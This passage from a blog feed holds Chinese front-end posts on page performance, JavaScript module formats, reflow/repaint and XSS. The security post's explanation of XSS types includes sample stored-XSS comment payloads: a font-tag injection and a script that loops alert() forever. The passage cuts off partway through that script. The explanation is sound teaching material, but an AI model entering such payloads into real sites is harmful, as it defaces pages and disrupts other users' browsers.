        <content type="html"><![CDATA[<h2 id="1-减少HTTP请求次数"><a href="#1-减少HTTP请求次数" class="headerlink" title="1.减少HTTP请求次数"></a>1.减少HTTP请求次数</h2><p>基本原理：在浏览器和服务器之间发生信息交换时，需要耗费大量时间，而一个正常的http请求是比较复杂的，平凡的发送http请求会大大降低运行速度；而当我们请求的网页中有多个图片、css、js时会频繁的与服务器建立连接，释放连接，会造成资源的浪费，所以减少http请求次数会提高性能；</p><p>具体方法：尽量和并图片、css、js。</p><p>网速相同的情况下，加载一个100kb的图片比加载两个50kb的图片要快的多；</p><p>如果加载一个页面有5个css文件，则会发出5次http请求，如果合并成一个文件，只会发送一个http请求；</p><h2 id="2-使用CDN加速"><a href="#2-使用CDN加速" class="headerlink" title="2.使用CDN加速"></a>2.使用CDN加速</h2><p>基本原理：CDN是内容分发网络，网络上的静态资源即css、js均使用CDN分发，图片亦然；</p><p>将css放在顶部：网页上的资源加载是从上往下顺序加载的，所以css放在页面的顶部能够优先渲染页面，让用户感觉页面加载很快。</p><p>将js放在底部：加载js时会对后续的资源造成阻塞，必须得等js加载完才去加载后续文件，所以就把js放在页面底部最后加载。</p><h2 id="3-减少DOM操作"><a href="#3-减少DOM操作" class="headerlink" title="3.减少DOM操作"></a>3.减少DOM操作</h2><p>基本原理：对DOM操作的代价是非常大的，也是网页应用中的一个性能瓶颈；</p><p>解决方法：修改和访问DOM元素会造成页面回流和重绘，所以需要合理的使用js变量存储内容，考虑大量DOM元素中循环的性能开销、减少DOM元素的查询和修改，查询时可将其赋值给局部变量。</p><h2 id="4-正确理解重排和重绘"><a href="#4-正确理解重排和重绘" class="headerlink" title="4.正确理解重排和重绘"></a>4.正确理解重排和重绘</h2><p>基本原理：重绘就是在一个元素的外观被改变，但没有改变布局（宽高）如改变visibility、outline、背景色等等。</p><p>重排就是DOM的变化影响到了元素的几何属性（宽和高），浏览器会重新计算元素的几何属性，会使渲染树中受                       到影响的部分失效，浏览器会验证DOM树上的所有其他节点的visibility属性，这也是重排低效的原因。如：改变窗口大小、改变文字大小、内容的改变、浏览器窗口变化、style属性的改变等等。如果重排过于频繁，cpu使用率就会蹭蹭往上涨。</p><p>解决办法：上面提到通过设置style属性改变节点样式的话，每设置一次都会导致一次重排，所以最好通过设置class的方式；<br>有动画效果的元素，它的position属性应该设为fixed或absolute，这样不会影响其它元素的布局；如果功能需求上不能设置fixed或absolute,那么就权衡速度的平滑性.</p><p>总之：因为reflow有时不可避免，所以只能尽可能限制重排的影响。</p><h2 id="5-使用json格式进行数据交换"><a href="#5-使用json格式进行数据交换" class="headerlink" title="5.使用json格式进行数据交换"></a>5.使用json格式进行数据交换</h2><p>基本原理：JSON是一种轻量级的数据交换格式，采用完全独立于语言的文本格式，是理想的数据交换格式。同时，JSON是Javascript原生格式，这意味着在javascript中处理JSON数据不需要任何特殊的API或工具包。</p><p>与XML序列化相比，JSON序列化后产生的数据一般要比XML序列化后数据体积小，所以在Facebook等知名网站中都采用lJSON作为数据交换方式。</p><p>JS操作JSON：</p><p>在JSON中，有两个结构：对象和数组。</p><p>一个对象以 “ { ” 开始，“ } ” 结束。每个“名称”后跟一个 “ : ” ；“名称/值 对”之间使用 “ , ”（逗号）分隔。 名称用引号括起来；值如果是字符串则必须用引号括起来，数值型则不需要。如：<br>var obj={“name”:”darren”,”age”:24,”location”:”beijing”}<br>数组是值（value）的有序集合。一个数组以 “ [ ” 开始， “ ] ” 结束。值之间使用 “ , ” （逗号）分隔。如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">var jsonlist=[&#123;<span class="hljs-string">"name"</span>:<span class="hljs-string">"darren"</span>,<span class="hljs-string">"age"</span>:24,<span class="hljs-string">"location"</span>:<span class="hljs-string">"beijing"</span>&#125;,    <br><br>&#123;<span class="hljs-string">"name"</span>:<span class="hljs-string">"weidong.nie"</span>,<span class="hljs-string">"age"</span>:24,<span class="hljs-string">"location"</span>:<span class="hljs-string">"hunan"</span>&#125;];<br></code></pre></td></tr></table></figure></p><p>对这种数组和对象字面量的操作是非常方便且高效的。如果预先知道JSON结构的情况下，使用JSON进行数据传递简直是太美妙了，可以写出很实用美观可读性强的代码。如果你是纯粹的前台开发人员，一定会非常喜欢JSON。</p><h2 id="6-高效使用HTML和css样式"><a href="#6-高效使用HTML和css样式" class="headerlink" title="6.高效使用HTML和css样式"></a>6.高效使用HTML和css样式</h2><p>基本原理：HTML是一门描述网页的语言，它使用标记标签描述网页；</p><p>CSS指层叠样式表；</p><p>解决方法：精简CSS和JS，对css和js进行压缩，如可以使用grunt，glup等工具，也可以较为简单的人为的把css文件中的空格以及不需要的部分去掉。</p><p>删除重复的JS和CSS，重复调用脚本，除了增加额外的http请求，多次运算也会浪费时间，在IE和火狐中不管脚本是否缓存，他们都在重复运算js的问题。</p><h2 id="7-图片压缩和使用Sprite"><a href="#7-图片压缩和使用Sprite" class="headerlink" title="7.图片压缩和使用Sprite"></a>7.图片压缩和使用Sprite</h2><p>基本原理：1.缩小图片分辨率；</p><p>2.改变图片格式；</p><p>3.降低图片保存质量</p><p>图片精灵技术：把许多图片放到一张大图片里，通过CSS来显示图片的一部分；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;div&gt;<br>    &lt;span id=<span class="hljs-string">"image1"</span> class=<span class="hljs-string">"nav"</span>&gt;&lt;/span&gt;<br>    &lt;span id=<span class="hljs-string">"image2"</span> class=<span class="hljs-string">"nav"</span>&gt;&lt;/span&gt;<br>    &lt;span id=<span class="hljs-string">"image3"</span> class=<span class="hljs-string">"nav"</span>&gt;&lt;/span&gt;<br>    &lt;span id=<span class="hljs-string">"image4"</span> class=<span class="hljs-string">"nav"</span>&gt;&lt;/span&gt;<br>    &lt;span id=<span class="hljs-string">"image5"</span> class=<span class="hljs-string">"nav"</span>&gt;&lt;/span&gt;<br>&lt;/div&gt;<br>.nav &#123;<br>    width: 50px;<br>    height: 50px;<br>    display: inline-block;<br>    border: 1px solid <span class="hljs-comment">#000;</span><br>    background-image: url(<span class="hljs-string">'E:/1.png'</span>);<br>&#125;<br><span class="hljs-comment">#image1 &#123;</span><br>        background-position: 0 0;<br>&#125;<br><span class="hljs-comment">#image2 &#123;</span><br>        background-position: -95px 0;<br>&#125;<br><span class="hljs-comment">#image3 &#123;</span><br>        background-position: -185px 0;<br>&#125;<br><span class="hljs-comment">#image4 &#123;</span><br>        background-position: -275px 0;<br>&#125;<br><span class="hljs-comment">#image5 &#123;</span><br>        background-position: -366px -3px;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="8-注意控制cookie大小和污染"><a href="#8-注意控制cookie大小和污染" class="headerlink" title="8.注意控制cookie大小和污染"></a>8.注意控制cookie大小和污染</h2><p>每次请求时都会带着cookie跑，所以要尽量减少cookie的大小，尽可能除去没用的cookie；</p><p>cookie是有生命周期的，所以要注意设置合理的时间，可以提高用户的相应时间。</p><h2 id="9-添加Expires头"><a href="#9-添加Expires头" class="headerlink" title="9.添加Expires头"></a>9.添加Expires头</h2><p>页面的初次访问者会进行很多HTTP请求，但是通过使用一个长久的Expires头，可以使这些组件被缓存，下次访问的时候，就可以减少不必要的HTPP请求，从而提高加载速度。</p><p>Web服务器通过Expires头告诉客户端可以使用一个组件的当前副本，直到指定的时间为止。例如：</p><blockquote><p>Expires: Fri, 18 Mar 2016 07:41:53 GMT</p></blockquote><p>Expires缺点： 它要求服务器和客户端时钟严格同步；过期日期需要经常检查</p><p>HTTP1.1中引入Cache-Control来克服Expires头的限制，使用max-age指定组件被缓存多久。</p><blockquote><p>Cache-Control： max-age=12345600</p></blockquote><p>若同时制定Cache-Control和Expires，则max-age将覆盖Expires头.</p><h2 id="10-压缩组件"><a href="#10-压缩组件" class="headerlink" title="10.压缩组件"></a>10.压缩组件</h2><p>从HTTP1.1开始，Web客户端可以通过HTTP请求中的Accept-Encoding头来表示对压缩的支持</p><blockquote><p>Accept-Encoding: gzip,deflate</p></blockquote><p>如果Web服务器看到请求中有这个头，就会使用客户端列出来的方法中的一种来进行压缩。Web服务器通过响应中的Content-Encoding来通知 Web客户端。</p><blockquote><p>Content-Encoding: gzip</p></blockquote><h2 id="11-代理缓存"><a href="#11-代理缓存" class="headerlink" title="11.代理缓存"></a>11.代理缓存</h2><p>当浏览器通过代理来发送请求时，情况会不一样。假设针对某个URL发送到代理的第一个请求来自于一个不支持gzip的浏览器。这是代理的第一个请求，缓存为空。代理将请求转发给服务器。此时响应是未压缩的，代理缓存同时发送给浏览器。现在，假设到达代理的请求是同一个url，来自于一个支持gzip的浏览器。代理会使用缓存中未压缩的内容进行响应，从而失去了压缩的机会。相反，如果第一个浏览器支持gzip，第二个不支持，你们代理缓存中的压缩版本将会提供给后续的浏览器，而不管它们是否支持gzip。</p><p>解决办法：在web服务器的响应中添加vary头Web服务器可以告诉代理根据一个或多个请求头来改变缓存的响应。因为压缩的决定是基于Accept-Encoding请求头的，因此需要在vary响应头中包含Accept-Encoding。</p><blockquote><p>vary: Accept-Encoding</p></blockquote><h2 id="12-减少DNS查找"><a href="#12-减少DNS查找" class="headerlink" title="12.减少DNS查找"></a>12.减少DNS查找</h2><p>当我们在浏览器的地址栏输入网址（譬如： <a href="http://www.linux178.com）" target="_blank" rel="noopener">www.linux178.com）</a> ，然后回车，回车这一瞬间到看到页面到底发生了什么呢？</p><p>域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面进行渲染呈现给用户</p><p>域名解析是页面加载的第一步，那么域名是如何解析的呢？以Chrome为例：</p><blockquote><ol><li>Chrome浏览器 会首先搜索浏览器自身的DNS缓存（缓存时间比较短，大概只有1分钟，且只能容纳1000条缓存），看自身的缓存中是否有<a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 对应的条目，而且没有过期，如果有且没有过期则解析到此结束。<br>注：我们怎么查看Chrome自身的缓存？可以使用 chrome://net-internals/#dns 来进行查看</li><li>如果浏览器自身的缓存里面没有找到对应的条目，那么Chrome会搜索操作系统自身的DNS缓存,如果找到且没有过期则停止搜索解析到此结束.<br>注：怎么查看操作系统自身的DNS缓存，以Windows系统为例，可以在命令行下使用 ipconfig /displaydns 来进行查看</li><li>如果在Windows系统的DNS缓存也没有找到，那么尝试读取hosts文件（位于C:\Windows\System32\drivers\etc），看看这里面有没有该域名对应的IP地址，如果有则解析成功。</li><li>如果在hosts文件中也没有找到对应的条目，浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求（通过的是UDP协议向DNS的53端口发起请求，这个请求是递归的请求，也就是运营商的DNS服务器必须得提供给我们该域名的IP地址），运营商的DNS服务器首先查找自身的缓存，找到对应的条目，且没有过期，则解析成功。如果没有找到对应的条目，则有运营商的DNS代我们的浏览器发起迭代DNS解析请求，它首先是会找根域的DNS的IP地址（这个DNS服务器都内置13台根域的DNS的IP地址），找打根域的DNS地址，就会向其发起请求（请问 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 这个域名的IP地址是多少啊？），根域发现这是一个顶级域com域的一个域名，于是就告诉运营商的DNS我不知道这个域名的IP地址，但是我知道com域的IP地址，你去找它去，于是运营商的DNS就得到了com域的IP地址，又向com域的IP地址发起了请求（请问 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 这个域名的IP地址是多少?）,com域这台服务器告诉运营商的DNS我不知道 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 这个域名的IP地址，但是我知道 linux178.com 这个域的DNS地址，你去找它去，于是运营商的DNS又向 linux178.com 这个域名的DNS地址（这个一般就是由域名注册商提供的，像万网，新网等）发起请求（请问 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 这个域名的IP地址是多少？），这个时候    linux178.com 域的DNS服务器一查，诶，果真在我这里，于是就把找到的结果发送给运营商的DNS服务器，这个时候运营商的DNS服务器就拿到了 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 这个域名对应的IP地址，并返回给Windows系统内核，内核又把结果返回给浏览器，终于浏览器拿到了 <a href="http://www.linux178.com" target="_blank" rel="noopener">www.linux178.com</a> 对应的IP地址，该进行一步的动作了。<br>注：一般情况下是不会进行以下步骤的<br>如果经过以上的4个步骤，还没有解析成功，那么会进行如下步骤： </li><li>操作系统就会查找NetBIOS name Cache（NetBIOS名称缓存，就存在客户端电脑中的），那这个缓存有什么东西呢？凡是最近一段时间内和我成功通讯的计算机的计算机名和Ip地址，就都会存在这个缓存里面。什么情况下该步能解析成功呢？就是该名称正好是几分钟前和我成功通信过，那么这一步就可以成功解析。</li><li>如果第5步也没有成功，那会查询WINS 服务器（是NETBIOS名称和IP地址对应的服务器）</li><li>如果第6步也没有查询成功，那么客户端就要进行广播查找</li><li>如果第7步也没有成功，那么客户端就读取LMHOSTS文件（和HOSTS文件同一个目录下，写法也一样）<br>如果第八步还没有解析成功，那么就宣告这次解析失败，那就无法跟目标计算机进行通信。只要这八步中有一步可以解析成功，那就可以成功和目标计算机进行通信。</li></ol></blockquote><p>DNS也是开销，通常浏览器查找一个给定域名的IP地址要花费20~120毫秒，在完成域名解析之前，浏览器不能从服务器加载到任何东西。那么如何减少域名解析时间，加快页面加载速度呢？</p><p>当客户端DNS缓存（浏览器和操作系统）缓存为空时，DNS查找的数量与要加载的Web页面中唯一主机名的数量相同，包括页面URL、脚本、样式表、图片、Flash对象等的主机名。减少主机名的 数量就可以减少DNS查找的数量。</p><p>减少唯一主机名的数量会潜在减少页面中并行下载的数量（HTTP 1.1规范建议从每个主机名并行下载两个组件，但实际上可以多个），这样减少主机名和并行下载的方案会产生矛盾，需要大家自己权衡。建议将组件放到至少两个但不多于4个主机名下，减少DNS查找的同时也允许高度并行下载。</p><h2 id="13-避免重定向"><a href="#13-避免重定向" class="headerlink" title="13.避免重定向"></a>13.避免重定向</h2><h3 id="什么是重定向"><a href="#什么是重定向" class="headerlink" title="什么是重定向"></a>什么是重定向</h3><p>重定向用于将用户从一个URL重新路由到另一个URL。</p><h3 id="常用重定向的类型"><a href="#常用重定向的类型" class="headerlink" title="常用重定向的类型"></a>常用重定向的类型</h3><p>301：永久重定向，主要用于当网站的域名发生变更之后，告诉搜索引擎域名已经变更了，应该把旧域名的的数据和链接数转移到新域名下，从而不会让网站的排名因域名变更而受到影响。</p><p>302：临时重定向，主要实现post请求后告知浏览器转移到新的URL。</p><p>304：Not Modified，主要用于当浏览器在其缓存中保留了组件的一个副本，同时组件已经过期了，这是浏览器就会生成一个条件GET请求，如果服务器的组件并没有修改过，则会返回304状态码，同时不携带主体，告知浏览器可以重用这个副本，减少响应大小。</p><h3 id="重定向如何损伤性能"><a href="#重定向如何损伤性能" class="headerlink" title="重定向如何损伤性能"></a>重定向如何损伤性能</h3><p>当页面发生了重定向，就会延迟整个HTML文档的传输。在HTML文档到达之前，页面中不会呈现任何东西，也没有任何组件会被下载。</p><p>来看一个实际例子：对于ASP.NET webform开发来说，对于新手很容易犯一个错误，就是把页面的连接写成服务器控件后台代码里，例如用一个Button控件，在它的后台click事件中写上：Response.Redirect(“”)；然而这个Button的作用只是转移URL，这是非常低效的做法，因为点击Button后，先发送一个Post请求给服务器，服务器处理Response.Redirect(“”)后就发送一个302响应给浏览器，浏览器再根据响应的URL发送GET请求。正确的做法应该是在html页面直接使用a标签做链接，这样就避免了多余的post和重定向。</p><h3 id="重定向的应用场景"><a href="#重定向的应用场景" class="headerlink" title="重定向的应用场景"></a>重定向的应用场景</h3><h4 id="1-跟踪内部流量"><a href="#1-跟踪内部流量" class="headerlink" title="1.跟踪内部流量"></a>1.跟踪内部流量</h4><p>重定向经常用于跟踪用户流量的方向,当拥有一个门户主页的时候，同时想对用户离开主页后的流量进行跟踪，这时可以使用重定向。例如: 某网站主页新闻的链接地址 <a href="http://a.com/r/news" target="_blank" rel="noopener">http://a.com/r/news</a> ，点击该链接将产生301响应，其Location被设置为 <a href="http://news.a.com" target="_blank" rel="noopener">http://news.a.com</a> 。通过分析a.com的web服务器日志可以得知人们离开首页之后的去向。</p><p>我们知道重定向是如何损伤性能的，为了实现更好的效率，可以使用Referer日志来跟踪内部流量去向。每个HTTP请求都有一个Referer表示原始请求页(除了从书签打开或直接键入URL等操作)，记录下每个请求的Referer，就避免了向用户发送重定向，从而改善了响应时间。</p><h4 id="2-跟踪出站流量"><a href="#2-跟踪出站流量" class="headerlink" title="2.跟踪出站流量"></a>2.跟踪出站流量</h4><p>有时链接可能将用户带离你的网站，在这种情况下，使用Referer就不太现实了。</p><p>同样也可以使用重定向来解决跟踪出站流量问题。以百度搜索为例，百度通过将每个链接包装到一个302重定向来解决跟踪的问题，例如搜索关键字“前端性能优化”，搜索结果中的一个URL为 <a href="https://www.baidu.com/link?url=pDjwTfa0IAf_FRBNlw1qLDtQ27YBujWp9jPN4q0QSJdNtGtDBK3ja3jyyN2CgxR5aTAywG4SI6V1NypkSyLISWjiFuFQDinhpVn4QE-uLGG&amp;wd=&amp;eqid=9c02bd21001c69170000000556ece297" target="_blank" rel="noopener">https://www.baidu.com/link?url=pDjwTfa0IAf_FRBNlw1qLDtQ27YBujWp9jPN4q0QSJdNtGtDBK3ja3jyyN2CgxR5aTAywG4SI6V1NypkSyLISWjiFuFQDinhpVn4QE-uLGG&amp;wd=&amp;eqid=9c02bd21001c69170000000556ece297</a> ，即使搜索结果并没有变，但这个字符串是动态改变的，暂时还不知道这里起到怎样的作用？（个人感觉：字符串中包含了待访问的网址，点击之后会产生302重定向，将页面转到目标页面（待修改，求大神们给我指正））</p><p>除了重定向外，我们还可以选择使用信标(beacon)——一个HTTP请求，其URL中包含有跟踪信息。跟踪信息可以从信标Web服务器的访问日记中提取出来，信标通常是一个1px*1px的透明图片，不过204响应更优秀，因为它更小，从来不被缓存，而且绝不会改变浏览器的状态。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMD,CMD,CommonJS</title>
      <link href="/2018/07/31/AMD-CMD-CommonJS/"/>
      <url>/2018/07/31/AMD-CMD-CommonJS/</url>
      
        <content type="html"><![CDATA[<h2 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h2><p>CommonJS是在浏览器环境之外构建JavaScript生态系统为目标产生的项目，比如服务器和桌面环境中。CommonJS规范是为了解决JavaScript的作用域问题而定义的模块形式，<br>可以使每个模块在它自身的命名空间中执行。该规范的主要内容是：模块必须通过  module.exports导出对外的变量或接口，通过require()来导入其他模块的输出到当前模块。<br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">// moduleA.js<br>module.exports = <span class="hljs-keyword">function</span>( value )&#123;<br>    <span class="hljs-built_in">return</span> value * 2;<br>&#125;<br></code></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">// moduleB.js<br>var multiplyBy2 = require(<span class="hljs-string">'./moduleA'</span>);<br>var result = multiplyBy2(4);<br></code></pre></td></tr></table></figure><p>CommonJS是同步加载模块，但其实也有浏览器端的实现，其原理是将所有模块都定义好并通过id进行索引，这样就可以浏览器进行解析了</p><p>服务器端的Node.js遵循CommonJS规范。核心思想是允许模块通过require 方法来同步加载所要依赖的其他模块，然后通过 exports或module.exports来导出需要暴露的接口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">require(<span class="hljs-string">"module"</span>);<br>require(<span class="hljs-string">"../file.js"</span>);<br>exports.doStuff = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;&#125;;<br>module.exports = someValue;<br></code></pre></td></tr></table></figure><h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h3><ul><li>服务器便于重用</li><li>NPM中已经将近20W个模块包</li><li>简单并容易使用</li></ul><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><ul><li>同步的模块方式不适合在浏览器环境中，同步意味着阻塞加载，浏览器资源是异步加载的</li><li>不能非阻塞的并行加载多个模块</li></ul><h3 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h3><p><a href="http://zhaoda.net/webpack-handbook/module-system.html" target="_blank" rel="noopener">http://zhaoda.net/webpack-handbook/module-system.html</a><br><a href="http://javascript.ruanyifeng.com/nodejs/module.html#toc4" target="_blank" rel="noopener">http://javascript.ruanyifeng.com/nodejs/module.html#toc4</a></p><hr><h2 id="AMD-异步模块定义"><a href="#AMD-异步模块定义" class="headerlink" title="AMD(异步模块定义)"></a>AMD(异步模块定义)</h2><p>AMD规范其实只有一个主要接口 define(id,dependencies,factory)，它要在声明模块的时候指定所有的依赖dependencies，并且还要当做形参传到factory中，对于依赖的模块提前执行，依赖前置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">define(<span class="hljs-string">"module"</span>, [<span class="hljs-string">"dep1"</span>, <span class="hljs-string">"dep2"</span>], <span class="hljs-keyword">function</span>(d1, d2) &#123;<br>  <span class="hljs-built_in">return</span> someExportedValue;<br>&#125;);<br>require([<span class="hljs-string">"module"</span>, <span class="hljs-string">"../file"</span>], <span class="hljs-keyword">function</span>(module, file) &#123; /* ... */ &#125;);<br></code></pre></td></tr></table></figure></p><h3 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h3><ul><li>适合在浏览器环境异步加载</li><li>并行加载多个模块<h3 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h3></li><li>提高开发成本，代码阅读和书写比较困难</li><li>不符合通用的模块思维方式，是一种妥协的实现</li></ul><h3 id="详细-1"><a href="#详细-1" class="headerlink" title="详细"></a>详细</h3><p><a href="http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html</a></p><hr><h2 id="CMD（通用模块定义）"><a href="#CMD（通用模块定义）" class="headerlink" title="CMD（通用模块定义）"></a>CMD（通用模块定义）</h2><p>CMD规范和AMD相似，尽量保持简单，并且与CommonJS和NodeJS的Modules规范保持了很大的兼容性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">define(<span class="hljs-keyword">function</span>(require, exports, module) &#123;<br>  var $ = require(<span class="hljs-string">'jquery'</span>);<br>  var Spinning = require(<span class="hljs-string">'./spinning'</span>);<br>  exports.doSomething = ...<br>  module.exports = ...<br>&#125;)<br></code></pre></td></tr></table></figure></p><h3 id="优点：-2"><a href="#优点：-2" class="headerlink" title="优点："></a>优点：</h3><ul><li>依赖就近，延迟执行</li><li>很容易在node中运行<h3 id="缺点：-2"><a href="#缺点：-2" class="headerlink" title="缺点："></a>缺点：</h3></li><li>依赖SPM打包，模块的家在逻辑偏重<h3 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h3>SeaJS</li></ul>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reflow与repaint</title>
      <link href="/2018/07/31/reflow%E4%B8%8Erepaint/"/>
      <url>/2018/07/31/reflow%E4%B8%8Erepaint/</url>
      
        <content type="html"><![CDATA[<h2 id="reflow-回流-与-repaint-重绘"><a href="#reflow-回流-与-repaint-重绘" class="headerlink" title="reflow(回流) 与 repaint(重绘)"></a>reflow(回流) 与 repaint(重绘)</h2><p>reflow:当render树中的一部分或者全部因为大小边距等问题发生改变而需重建的过程叫回流；</p><p>理解：会影响排版的情况下。</p><p>repaint：当元素的一部分属性发生变化，如外观背景色不会引起布局变化而需要重新渲染的过程叫做重绘；</p><p>理解：浏览器得知元素产生了不影响排版的情况下后对这个元素进行重新绘制的过程。例如改变背景色，加个下划线。</p><h3 id="回流原因"><a href="#回流原因" class="headerlink" title="回流原因"></a>回流原因</h3><p> 浏览器在实现回流时，会递归的处理frame，每个frame的回流都有一个原因，这个原因会随着frame逐级向下传递（传递过程中可能会改变），回流的原因决定了当前frame的回流行为：</p><p>1.初始化（initial):DOM载入后的第一次回流，将会遍历所有frame；</p><p>2.渐进（Incremental）：当一个frame发生渐进回流时，意味着它的前面的元素都没有变，而是它里面的元素变了。这会引                                            起自底想上的作用。 </p><p>3.改变大小(Resize):元素的容器边界发生变化时，此时元素内部状态没变，在计算自顶向下的布局约束的同时，可以复用内部                                  状态。</p><p>4.样式改变（stylechange）：整个frame树都应得到遍历。</p><p>5.Dirty：当一个容器已经缓存了多个子元素的Incremental回流时，该容器出于Dirty的状态。</p><h2 id="常见的引起回流的具体操作"><a href="#常见的引起回流的具体操作" class="headerlink" title="常见的引起回流的具体操作"></a>常见的引起回流的具体操作</h2><p>1.调整窗口大小；</p><p>2.改变字体大小；</p><p>3.样式表改动；</p><p>4.元素内容变化，尤其是输入控件；</p><p>5.CSS伪类激活；</p><p>6.DOM操作；</p><p>7.offsetWidth, width, clientWidth, scrollTop/scrollHeight的计算， 会使浏览器将渐进回流队列Flush，立即执行回流</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端安全</title>
      <link href="/2018/07/31/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
      <url>/2018/07/31/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ul><li>xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。</li></ul><h3 id="xss主要分为三类"><a href="#xss主要分为三类" class="headerlink" title="xss主要分为三类"></a>xss主要分为三类</h3><ol><li>DOM xss :<br>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。</li><li>反射型 xss :<br>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。</li><li>存储型 xss :<br>存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</li></ol><h3 id="跨站脚本共计可能造成以下影响："><a href="#跨站脚本共计可能造成以下影响：" class="headerlink" title="跨站脚本共计可能造成以下影响："></a>跨站脚本共计可能造成以下影响：</h3><ol><li>利用虚假输入表单边去用户个人信息。</li><li>利用脚本窃取用户的Cookie值，被害人在不知情的情况下，帮助攻击者发送恶意请求。</li><li>显示伪造的文章或图片。</li></ol><h3 id="存储型xss案例"><a href="#存储型xss案例" class="headerlink" title="存储型xss案例"></a>存储型xss案例</h3><p>在项目开发中，评论是个常见的功能，如果直接把评论的内容保存到数据库，那么显示的时候就可能被攻击。</p><p>如果你只是想试试 xss，可以这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;font size=<span class="hljs-string">"100"</span> color=<span class="hljs-string">"red"</span>&gt;试试水&lt;/font&gt;<br></code></pre></td></tr></table></figure></p><p>或这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        alert(<span class="hljs-string">'Hello'</span>)<br>    